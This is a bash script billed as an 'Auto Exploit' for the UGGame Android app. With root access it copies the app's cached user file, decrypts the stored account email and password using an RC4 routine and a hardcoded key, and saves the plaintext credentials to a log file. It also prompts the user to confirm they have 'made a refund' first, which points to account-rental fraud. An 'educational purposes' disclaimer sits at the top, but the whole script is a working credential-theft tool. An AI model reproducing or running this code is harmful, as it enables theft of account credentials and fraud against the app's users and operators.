#!/bin/bash
# """ Any type of unethical hacking is borne by each individual who does it, this is made for educational purposes. """
__name__="KvlarG for UGGame Exploitation."
__author__="@kvlarbyte"
__version__="1.0"

# // Constant.
currentDir=$(dirname "$0")
decryptionKey="df831c18fa703096" # this is the key to decrypt, do not change it.
filePath="/data/user/0/com.dofun.zhw.abroad.indonesia/files/mmkv/user_cache"

# // Variable.
# -- Defines the logging path.
logsPath="$currentDir/logs"

# // Function.
# / --- Decryptor Function -> RC4 Cipher (Rivest Cipher 4) Encryption Algorithm. 
kvlarSolver() {
    key="$1"
    ciphertext="$2"
    # -- Convert key to array of ASCII values.
    key_arr=()
    for i in $(seq 0 $((${#key} - 1))); do
        key_arr+=($(printf "%d" "'${key:$i:1}"))
    done
    # -- Initialize S-box
    S=($(seq 0 255))
    j=0
    key_length=${#key_arr[@]}
    # -- KSA (Key-Scheduling Algorithm).
    for i in $(seq 0 255); do
        j=$(( (j + S[i] + key_arr[i % key_length]) % 256 ))
        temp=${S[i]}
        S[i]=${S[j]}
        S[j]=$temp
    done
    # -- PRGA (Pseudo-Random Generation Algorithm).
    i=0
    j=0
    plaintext=""
    idx=0
    while [ $idx -lt ${#ciphertext} ]; do
        i=$(( (i + 1) % 256 ))
        j=$(( (j + S[i]) % 256 ))
        temp=${S[i]}
        S[i]=${S[j]}
        S[j]=$temp
        K=${S[((S[i] + S[j]) % 256)]}
        # -- Convert 2 hex characters to decimal.
        byte_hex=${ciphertext:$idx:2}
        byte_dec=$(( 0x$byte_hex ))
        # -- Perform XOR operation.
        plaintext_byte=$(( byte_dec ^ K ))
        # -- Append plaintext byte to result
        plaintext=$(printf "%s\\x$(printf "%x" $plaintext_byte)" "$plaintext")
        idx=$(( idx + 2 ))
    done
    # -- Return output.
    echo -n "$plaintext"
}

# // Main.
# -- Show Banners.
echo "
            ╦╔═╦  ╦╦  ╔═╗╦═╗  
            ╠╩╗╚╗╔╝║  ╠═╣╠╦╝  
            ╩ ╩ ╚╝ ╩═╝╩ ╩╩╚═  
________________ [$(date +"%H:%M")] ________________
// KvlarG - Auto Exploit UGGame.
_________________________________________
"
# -- Check root privilege.
[ "$(id -u)" -ne 0 ] && echo "[LOGS]:  this script must be run as root." && exit 1
# -- Get user_cache then copy it to the cache directory.
echo "[LOGS]:  trying to get user_cache..."
if [ ! -f "$filePath" ]; then
    echo "[LOGS]:  user_cache not found!"
    echo "[LOGS]:  program terminated!"
    exit 1
fi
echo "[LOGS]:  user_cache has been found!"
cp "$filePath" "/sdcard/"
# -- Make sure u make a refund.
echo "[LOGS]:  make sure u have made a refund, type enter to continue!"
read continue_
# -- Initialize some objects.
cacheFile="/sdcard/user_cache"
rawAccount=$(strings "$cacheFile" | grep -o '"account":"[^"]*' | sed 's/"account":"//')
rawPassword=$(strings "$cacheFile" | grep -o '"password":"[^"]*' | sed 's/"password":"//')
# -- Trying to get credentials from user_cache.
echo "[LOGS]:  trying to get credentials..."
# -- Process data and validate it.
if [ -z "$rawAccount" ] || [ -z "$rawPassword" ]; then
    echo "[LOGS]:  email and password failed to be retrieved!"
else
    account=$(kvlarSolver "$decryptionKey" "$rawAccount")
    password=$(kvlarSolver "$decryptionKey" "$rawPassword")
    if [ -n "$account" ] && [ -n "$password" ]; then
        echo "[LOGS]:  email and password successfully retrieved!"
    fi
fi
# -- Saves credentials to logs.
savedAccount="
__________________ [$(date +"%H:%M")] ______________
// Kvlar Logs - UGGame Account Credentials.
_________________________________________
Email: $account
Password: $password
_________________________________________
"
echo "$savedAccount" > "$logsPath/kvlaraccount_$(date +"%d-%m-%Y_%H:%M").txt"
echo "[LOGS]:  account credentials saved to -> $logsPath/account_$(date +"%d-%m-%Y_%H:%M").txt"
# -- Delete previous cacheFile.
rm -rf "$cacheFile"